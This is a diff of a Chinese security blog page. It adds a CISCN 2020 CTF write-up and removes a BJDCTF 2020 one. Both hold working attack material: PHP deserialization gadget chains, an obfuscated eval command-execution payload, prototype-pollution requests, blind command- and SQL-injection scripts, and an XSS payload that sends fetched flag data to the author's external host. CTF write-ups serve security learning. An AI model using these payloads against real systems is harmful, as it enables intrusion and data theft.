@@ -66,6 +66,211 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-ciscn2020预选赛" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/08/21/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/" class="article-date">
+  <time class="dt-published" datetime="2020-08-21T09:50:28.606Z" itemprop="datePublished">2020-08-21</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/08/21/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/">ciscn2020预选赛</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="ciscn-2020-预选赛"><a href="#ciscn-2020-预选赛" class="headerlink" title="ciscn 2020 预选赛"></a>ciscn 2020 预选赛</h1><h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h2><p>和wmctf2020的webwebpayload相同</p>
+<pre><code class="php">&lt;?php
+namespace DB{
+    abstract class Cursor  implements \IteratorAggregate {}
+}
+
+
+namespace DB\SQL{
+    class Mapper extends \DB\Cursor{
+        protected
+            $props=[&quot;quotekey&quot;=&gt;&quot;phpinfo&quot;],
+            $adhoc=[-1=&gt;[&quot;expr&quot;=&gt;&quot;&quot;]],
+            $db;
+        function offsetExists($offset){}
+        function offsetGet($offset){}
+        function offsetSet($offset, $value){}
+        function offsetUnset($offset){}
+        function getIterator(){}
+        function __construct($val){
+            $this-&gt;db = $val;
+        }
+    }
+}
+namespace CLI{
+    class Agent {
+        protected
+            $server=&quot;&quot;;
+        public $events;
+        public function __construct(){
+            $this-&gt;events=[&quot;disconnect&quot;=&gt;array(new \DB\SQL\Mapper(new \DB\SQL\Mapper(&quot;&quot;)),&quot;find&quot;)];
+            $this-&gt;server=&amp;$this;
+
+
+        }
+    };
+    class WS{}
+}
+namespace {
+    echo urlencode(serialize(array(new \CLI\WS(),new \CLI\Agent())));
+}</code></pre>
+<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>阅读代码我们发现:<code>if(!pcntl_wifexited($status)){phpinfo();}</code>，及fork的子进程报错就会执行phpinfo，而phpinfo里面通常包含敏感信息，和一些对我们题目有帮助的信息。</p>
+<p>fork子进程执行的代码是：</p>
+<pre><code class="php">if(isset($_GET[&#39;a&#39;])&amp;&amp;is_string($_GET[&#39;a&#39;])&amp;&amp;!preg_match(&quot;/[:\\\\]|exec|pcntl/i&quot;,$_GET[&#39;a&#39;])){
+            call_user_func_array($_GET[&#39;a&#39;],[$_GET[&#39;b&#39;],false,true]);</code></pre>
+<p>而这里调用了非常敏感的call_user_func_array，所以无论是想让子进程报错还是直接执行代码这里都是非常好的选择。因此我们先要写个fuzz脚本：</p>
+<pre><code class="php">&lt;?php
+
+    $payloads=[
+        &quot;ls&quot;,//shell命令执行测试
+        &quot;index.php&quot;,//读取文件测试
+        &quot;asdfasldfjaklsdfjl.php&quot;,//创建文件/文件夹测试
+        &quot;echo 123;&quot;//php命令执行测试
+    ];
+    $str=file_get_contents(&quot;fatalerr.log&quot;);
+    if(!$str){
+        $str=&quot;[]&quot;;
+    }
+    $fatalerror=eval(&quot;return &quot;.$str.&quot;;&quot;);
+    function show_result($func,$r,$v){
+        if($r==NULL){
+        }
+        try{
+            echo &quot;$func($v,false,true) return value:&quot;;
+            var_dump($r);
+            echo &quot;&lt;br /&gt;&quot;;
+        }catch(Exception $e){}
+    }
+
+    function brute_func($a){
+        global $payloads;
+        global $fatalerror;
+
+        foreach($a as $val){
+
+            if(is_array($val)){
+                brute_func($val);
+                continue;
+            }
+
+            if(in_array($val,$fatalerror)){
+                continue;
+            }
+            array_push($fatalerror,$val);
+            file_put_contents(&quot;fatalerr.log&quot;,var_export($fatalerror,TRUE));
+            foreach($payloads as $v){
+                $r=NULL;
+
+                $r=call_user_func_array($val,[$v,false,true]);
+                show_result($val,$r,$v);
+
+            }
+            array_pop($fatalerror);
+
+        }
+    };
+    $arr=get_defined_functions();
+    brute_func($arr);
+?&gt;</code></pre>
+<p>多次执行发现：</p>
+<pre><code class="php">stream_socket_server
+exec
+stream_socket_client</code></pre>
+<p>这三个函数会引起segment_fault 且 exec虽然会引起segment  fault但是仍然执行了代码</p>
+<p>但是这里只需要segment_fault,所以访问<code>?a=stream_socket_server&amp;b=</code>拿到flag</p>
+<h2 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a>rceme</h2><p>注意到有个eval只要绕过限制就可以执行命令了</p>
+<p>很简单利用字符串拼接绕过</p>
+<p><code>{if:+(&#39;base64_deco&#39;.&#39;d&#39;.&#39;e&#39;)(&#39;c3lzdGVt&#39;)(&#39;cat+/flag&#39;)}{end+if}</code></p>
+<h2 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h2><p>队里的师傅做出来的,dbq，我太菜了</p>
+<pre><code class="php">&lt;?php
+class trick{
+    public $trick1;
+    public $trick2;
+}
+
+
+$t = new trick;
+$t-&gt;trick1 = &quot;INF&quot;;
+$t-&gt;trick2 = 1e1111;
+echo serialize($t);
+</code></pre>
+<h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h2><pre><code>λ npm audit
+
+                       === npm audit security report ===
+
+# Run  npm update set-value --depth 1  to resolve 1 vulnerability
+
+  High            Prototype Pollution
+
+  Package         set-value
+
+  Dependency of   set-value
+
+  Path            set-value
+
+  More info       https://npmjs.com/advisories/1012
+
+
+
+found 1 high severity vulnerability in 61 scanned packages
+  run `npm audit fix` to fix 1 of them.</code></pre><p>原型链污染，poc地址：<br><a href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-SETVALUE-450213</a></p>
+<ul>
+<li>先访问一次<code>/SpawnPoint</code>，拿个sessionid</li>
+<li>然后访问<code>/Privilege</code>污染原型链（用<code>constructor.prototype</code>或者<code>__proto__</code>均可）</li>
+<li>最后访问<code>/DeveloperControlPanel</code>拿flag</li>
+</ul>
+<pre><code>POST /Privilege HTTP/1.1
+Host: host
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=yoursession
+
+NewAttributeValue=abc&amp;NewAttributeKey=__proto__.password4
+
+POST /DeveloperControlPanel HTTP/1.1
+Host: host
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=yoursession
+
+key=password4&amp;password=abc</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/08/21/ciscn2020预选赛/">http://blog.ccreater.top/2020/08/21/ciscn2020预选赛/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/08/21/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/" data-id="cke41ze4i0000p8v0gx483e56" data-title="ciscn2020预选赛" class="article-share-link">Share</a>
+      
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
     <article id="post-ciscn2020easyphp出题笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/08/21/ciscn2020easyphp%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" class="article-date">
@@ -2472,285 +2677,6 @@ busybox nslookup www.test.com 172.29.126.2 看结果</code></pre><p><strong>本�
 
 
   
-    <article id="post-2020第三届BJDCTF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/05/24/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/" class="article-date">
-  <time class="dt-published" datetime="2020-05-23T16:40:57.277Z" itemprop="datePublished">2020-05-24</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/05/24/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/">2020第三届BJDCTF</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="2020BJDCTF第三届"><a href="#2020BJDCTF第三届" class="headerlink" title="2020BJDCTF第三届"></a>2020BJDCTF第三届</h1><h2 id="帮帮小红花"><a href="#帮帮小红花" class="headerlink" title="帮帮小红花"></a>帮帮小红花</h2><pre><code class="php"># -*-coding:utf-8 -*-
-import requests
-import re
-
-flag_format = re.compile(&#39;flag\\{[0-9a-z]{8}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{12}\\}&#39;)
-all_letter = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ-0123456789abcdefghijklmnopqrstuvwxyz()}{_&#39;
-
-
-def get_flag(command):
-    try:
-        r = requests.get(&#39;http://183.129.189.60:10071&#39;, params={&#39;imagin&#39;: command}, timeout=9)
-    except:
-        return True
-    return False
-
-
-if __name__ == &#39;__main__&#39;:
-    flag = &#39;BJD{make_iptables_great_again}&#39;
-    while flag_format.match(flag) == None:
-        staus = 0
-        for i in all_letter:
-            payload = &#39;cat /flag|grep %s &amp;&amp;sleep 10&#39; % (flag + i)
-            print(payload)
-            if get_flag(payload):
-                staus = 1
-                flag += i
-                print(flag)
-                break
-        if staus == 0:
-            flag = flag[0:-1]
-</code></pre>
-<h2 id="gob"><a href="#gob" class="headerlink" title="gob"></a>gob</h2><p><img src="C:%5CUsers%5C%E8%94%A1%E5%BB%BA%E6%96%8C%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200523090430266.png" alt="image968"></p>
-<p>可能存在反序列化</p>
-<p>和文件内容无关</p>
-<p>上传文件后发现有个filename字段，show界面是直接出现图片的base64编码，如果我们能控制filename字段就有可能任意读取</p>
-<p>当唯一麻烦的是，文件名后面有个md5校验值</p>
-<p>但是当我们直接上传的时候她会生成一个，哪怕没上传成功</p>
-<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200523095410.png" alt="image1220"></p>
-<p>直接拿来用访问show.php就拿到flag了</p>
-<h2 id="Multiplayer-Sports"><a href="#Multiplayer-Sports" class="headerlink" title="Multiplayer Sports"></a>Multiplayer Sports</h2><p> Powered by beego 1.12.1 </p>
-<p><a href="http://183.129.189.60:10112/?by=desc" target="_blank" rel="noopener">http://183.129.189.60:10112/?by=desc</a></p>
-<p>黑名单:<code>&#39;,&quot;,!,#,$,&amp;,+,;,&lt;,=,&gt;,?,@,\,|,if,exp,info,ascii,ord,sys,count,order,by,author,where</code></p>
-<p>给了个hint:<code>table</code>,不知道啥意思</p>
-<pre><code class="python">
-import requests
-import time
-import string
-
-
-def sqlinj(num):
-
-    burp0_url = &quot;http://183.129.189.60:10117/&quot;
-    param={&quot;by&quot;:&quot;,extractvalue(1,(case when ((select conv(right(left(hex( (select group_concat(a,b) from (select 1`a`,2`b` union select * from hint )`ff` ) ),{POS}),2),16,10)  )-{GUESS}) then 1 ELSE user() end))&quot;.format(POS=pos,GUESS=num)}
-    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;Q/+BAwEBBVVzZXJzAf+CAAEEAQhVc2VybmFtZQEMAAEIUGFzc3dvcmQBDAABCEZpbGVuYW1lAQwAAQRTaWduAQwAAABj/4IBA2FhYQEDYmJiATIuL3VwbG9hZHMvM2UxMDRjYWU2NDAxZDI1NzY2NzZiMmM2ODk3MzE1NGQvcTEuanBnASBhMjVhY2E4OGZkOGYzYjYyMTkyZTYxNzgwMDYzNWQ4NAA=&quot;, &quot;_xsrf&quot;: &quot;azI3QUxLb3JwTDh5MFI5aXlPM1ZOQ2Y4UnNUSkVnY3E=|1590202537824785027|837f32c5f7f2b6c2a5ad0ffbcc803dff791bb5a078a0b68ea40428f37dfdf2ae&quot;}
-    burp0_headers = {&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
-    r=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,params=param)
-    time.sleep(0.5)
-    print(param)
-    if &quot;/static/img/dundundun.gif&quot; in r.text:
-        print(&quot;filter &quot;,param)
-        exit()
-    if &quot;y1ng&quot; in r.text:
-
-        return False
-    else :
-        return True
-
-
-
-
-#database: ms
-#mysql,sys
-#Hint: /Source Password
-#table:gtid_executed,sys_config
-result=&quot;12,Hint: /Source Password: T1Me&quot;
-pos=len(result)*2+2
-
-while True:
-    flag=False
-    for i in string.printable:
-        if sqlinj(ord(i)):
-            result+=i
-            print(&quot;Found:&quot;+result)
-            flag=True
-            break
-        print(&quot;result:&quot;+result)
-    pos+=2
-    if flag is False:
-        break</code></pre>
-<h2 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h2><p><a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p>
-<p>flag.php</p>
-<pre><code class="php">if ($_SERVER[&#39;REMOTE_ADDR&#39;] === &#39;172.26.176.2&#39;) //only admin, who is at 172.26.176.2, can get FLAG
-    echo FLAG;
-else echo $_SERVER[&#39;REMOTE_ADDR&#39;];
-</code></pre>
-<p>bot脚本：</p>
-<pre><code class="php">
-if (isset($_POST[&#39;url&#39;]) &amp;&amp; isset($_POST[&#39;captcha&#39;]) ) { // report bug to our admin who is at 172.26.176.2, our admin will access the bug url to check
-    $url = $_POST[&#39;url&#39;];
-    $captcha = $_POST[&#39;captcha&#39;];
-    if ( checkNote($url) &amp;&amp; checkNote(urldecode($url)) &amp;&amp; checkURL($url) &amp;&amp;  substr(md5($captcha), 0 , 6) === $_SESSION[&#39;captcha&#39;] ) {
-        //admin checking, it will take several seconds
-
-    } else alertMes(&#39;something wrong&#39;, &#39;./report_bugs.php&#39;);
-}
-?&gt;</code></pre>
-<pre><code class="php">function checkURL($url) {
-    if ( preg_match(&#39;/[|~`^;&amp;]/m&#39;, $url) )
-        return false;
-    else return true;
-}
-function checkNote($s) {
-    $filter = &#39;/show|svg|archive|error|eval|on|atob|\\\u|&amp;#|let|cookie|meta|create|fetch|f[^a-z]*l[^a-z]*a[^a-z]*g|src|append|&lt;script&gt;|func|javascript|res|lo|then|ftp|const|ajax|\$|\&#39;|\&quot;/imX&#39;;
-    if (preg_match($filter, $s) || strlen($s) &gt;= 500 || strlen($s) &lt;= 1) return false;
-    else return true;
-}</code></pre>
-<p>csp:<code>Content-Security-Policy: default-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;; img-src &#39;self&#39;; object-src &#39;none&#39;; require-trusted-types-for &#39;script&#39;;</code></p>
-<p>绕过</p>
-<pre><code class="javascript">&lt;script &gt;xmlhttp=new XMLHttpRequest();
-xmlhttp[`\x6fnreadystatechange`]=()=&gt;{if(xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200){document[`\x6cocati\x6fn`][`href`]=`http://ccreat\x65r.top:60006/`+xmlhttp[`\x72espo\x6eseText`];}};xmlhttp.open(`GET`,`/lib\x2ffla\x67.php`,true);xmlhttp.send();&lt;/script&gt;</code></pre>
-<p>拿到flag</p>
-<h2 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h2><p> <a href="http://183.129.189.60:10057/" target="_blank" rel="noopener">http://183.129.189.60:10057/</a> </p>
-<pre><code>/flag.php
-/index.php
-/log.php
-/login.php
-/www.zip</code></pre><p>flag.php</p>
-<pre><code class="php">flag.php关键代码如下：
-$classname = $_GET[&#39;classname&#39;];
-$data = $_GET[&#39;data&#39;];
-$class = new $classname($data[&#39;a&#39;], $data[&#39;b&#39;]);
-Only users from the website can request this page. flag in /flag, have fun!</code></pre>
-<p>先登陆康康,需要key,相关代码在:</p>
-<pre><code class="php">&lt;?php
-    header(&quot;content-type:text/html;charset=utf-8&quot;);
-    session_start();
-    function getkey()
-    {
-        $key = &#39;&#39;;
-        $chars = str_split(&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;);
-        for ($i = 0; $i &lt; 48; $i++)
-        {
-            $key = $key . $chars[random_int(0, 61)];
-        }
-        $_SESSION[&#39;key&#39;] = $key;
-        return $key;
-    }
-    function getreferer() {
-        static $referer;
-        if (isset($_SERVER[&#39;HTTP_REFERER&#39;])) {
-                $referer = $_SERVER[&#39;HTTP_REFERER&#39;];
-            }
-        elseif(isset($_POST[&#39;URL_REFERER&#39;])){
-                $referer = $_POST[&#39;URL_REFERER&#39;];
-            }
-        else{
-            die(&quot;Where are you from?&quot;);
-        }
-        return $referer;
-    }
-        $key = getkey();
-        $url = getreferer();
-        if(!preg_match(&quot;/^http[s]{0,1}:\/\//i&quot;, $url)){
-            die(&quot;What do you want to do?&quot;);
-        }
-        $host = parse_url($url, PHP_URL_HOST);
-        if(preg_match(&quot;/^google\.com$/i&quot;, $host) or preg_match(&quot;/(.*)\.google\.com$/i&quot;, $host)){
-            $headers = get_headers($url,1);
-            if($headers[&#39;dd&#39;] === &#39;MeAquaNo_1!!!&#39;){
-                echo $key;
-            }
-            else{
-                echo &#39;dd beheading!&#39;;
-            }
-        }
-        else{
-            die(&quot;Only dd working at Google can get the key!&quot;);
-        }</code></pre>
-<h2 id="老开发"><a href="#老开发" class="headerlink" title="老开发"></a>老开发</h2><p> <a href="http://183.129.189.60:10000/" target="_blank" rel="noopener">http://183.129.189.60:10000/</a> </p>
-<p><img src="C:%5CUsers%5C%E8%94%A1%E5%BB%BA%E6%96%8C%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200523230022093.png" alt="image6583"></p>
-<p><img src="C:%5CUsers%5C%E8%94%A1%E5%BB%BA%E6%96%8C%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200523230029887.png" alt="image6695"></p>
-<p>User.php</p>
-<pre><code class="php">&lt;?php
-if ($_SERVER[&#39;SCRIPT_FILENAME&#39;] == __FILE__)
-    highlight_file(__FILE__);
-
-/**
- * @Entity
- * @Table(name=&quot;user&quot;)
- */
-class User
-{
-    /** 
-     * @Id
-     * @Column(type=&quot;integer&quot;)
-     * @GeneratedValue
-     */
-    protected $uid;
-    /** 
-     * @Column(type=&quot;string&quot;) 
-     * @unique
-     */
-    protected $username;
-    /** 
-     * @Column(type=&quot;string&quot;) 
-     */
-    protected $password;
-    /** 
-     * @Column(type=&quot;string&quot;) 
-     */
-    protected $role;
-
-    public function __get($name)
-    {
-        if (property_exists(__CLASS__, $name)) {
-            return $this-&gt;$name;
-        } else {
-            throw new Exception(&quot;Class &quot; . __CLASS__ . &quot; doesn&#39;t have property &quot; . $name);
-        }
-    }
-    public function __set($name, $value)
-    {
-        if (property_exists(__CLASS__, $name)) {
-            $this-&gt;$name = $value;
-        } else {
-            throw new Exception(&quot;Class &quot; . __CLASS__ . &quot; doesn&#39;t have property &quot; . $name);
-        }
-    }
-}</code></pre>
-<h2 id="布吉岛"><a href="#布吉岛" class="headerlink" title="布吉岛"></a>布吉岛</h2><p> <a href="http://183.129.189.60:10049/" target="_blank" rel="noopener">http://183.129.189.60:10049/</a> </p>
-<p> <a href="http://183.129.189.60:10050/" target="_blank" rel="noopener">http://183.129.189.60:10050/</a> </p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/05/24/2020第三届BJDCTF/">http://blog.ccreater.top/2020/05/24/2020第三届BJDCTF/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/05/24/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/" data-id="ckajv0tk5000008v0gudf486r" data-title="2020第三届BJDCTF" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -2808,6 +2734,10 @@ class User
       <ul>
         
           <li>
+            <a href="/2020/08/21/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/">ciscn2020预选赛</a>
+          </li>
+        
+          <li>
             <a href="/2020/08/21/ciscn2020easyphp%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/">ciscn2020easyphp出题笔记</a>
           </li>
         
@@ -2821,10 +2751,6 @@ class User
         
           <li>
             <a href="/2020/07/19/geekpwn2020/">geekpwn2020</a>
-          </li>
-        
-          <li>
-            <a href="/2020/07/09/bypass%20CORS/">bypass CORS</a>
           </li>
         
       </ul>
